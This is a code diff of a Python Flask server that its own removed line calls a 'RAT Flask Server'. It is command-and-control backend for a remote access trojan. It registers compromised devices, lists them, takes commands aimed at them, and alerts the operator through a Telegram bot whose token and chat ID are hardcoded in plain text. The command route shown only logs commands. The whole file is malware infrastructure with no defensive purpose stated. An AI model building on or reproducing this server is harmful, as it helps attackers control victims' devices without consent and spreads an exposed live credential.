@@ -4,75 +4,65 @@ import os
 import requests
 
 app = Flask(__name__)
+DEVICE_FILE = "devices.json"
 
-# Your bot info
 BOT_TOKEN = "7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc"
-OWNER_CHAT_ID = "7554840326"
-CLIENTS_FILE = "clients.json"
+CHAT_ID = "7554840326"
 
-# Utility to load clients from file
-def load_clients():
-    if not os.path.exists(CLIENTS_FILE):
-        return {}
-    with open(CLIENTS_FILE, "r") as f:
-        return json.load(f)
+# Load devices from file
+def load_devices():
+    if os.path.exists(DEVICE_FILE):
+        with open(DEVICE_FILE, "r") as f:
+            return json.load(f)
+    return {}
 
-# Utility to save clients to file
-def save_clients(clients):
-    with open(CLIENTS_FILE, "w") as f:
-        json.dump(clients, f, indent=2)
+# Save devices to file
+def save_devices(devices):
+    with open(DEVICE_FILE, "w") as f:
+        json.dump(devices, f)
 
-# Send message to bot owner
-def send_message(chat_id, text, buttons=None):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": chat_id,
-        "text": text,
-        "parse_mode": "Markdown"
-    }
-    if buttons:
-        payload["reply_markup"] = json.dumps({"keyboard": buttons, "resize_keyboard": True})
-    requests.post(url, data=payload)
+devices = load_devices()
 
-# Register new device
 @app.route("/register", methods=["POST"])
 def register():
     data = request.json
-    print(f"[REGISTER] Incoming data: {data}")
-
     device_id = data.get("device_id")
-    name = data.get("device_name")
+    device_name = data.get("device_name")
     chat_id = data.get("chat_id")
 
-    if not device_id or not name or not chat_id:
-        print("[REGISTER] Missing fields.")
-        return jsonify({"error": "Missing fields"}), 400
+    if device_id and device_name:
+        devices[device_id] = {
+            "device_name": device_name,
+            "chat_id": chat_id
+        }
+        save_devices(devices)
 
-    clients = load_clients()
-    clients[device_id] = {
-        "device_name": name,
-        "chat_id": chat_id
-    }
+        # Notify bot
+        msg = f"✅ Device connected:\nName: {device_name}\nID: {device_id}"
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
+            "chat_id": CHAT_ID,
+            "text": msg
+        })
+        return jsonify({"status": "registered"}), 200
 
-    print(f"[REGISTER] Saving clients: {clients}")
-    save_clients(clients)
+    return jsonify({"error": "Missing fields"}), 400
 
-    send_message(OWNER_CHAT_ID, f"✅ New device connected:\n• Name: {name}\n• ID: {device_id}")
-
-    return jsonify({"message": "Device registered"}), 200
-
-# Return list of devices
 @app.route("/devices", methods=["GET"])
-def list_devices():
-    clients = load_clients()
-    print(f"[DEVICES] Current clients: {clients}")
-    return jsonify(clients), 200
+def get_devices():
+    device_list = [
+        {"device_id": k, "device_name": v["device_name"]}
+        for k, v in devices.items()
+    ]
+    return jsonify({"devices": device_list}), 200
 
-# Default root route
-@app.route("/")
-def index():
-    return "RAT Flask Server is running!"
+@app.route("/command", methods=["POST"])
+def send_command():
+    data = request.json
+    device_id = data.get("device_id")
+    command = data.get("command")
+    print(f"Command for {device_id}: {command}")
+    return jsonify({"status": "sent"}), 200
 
+# Run the server
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=10000)
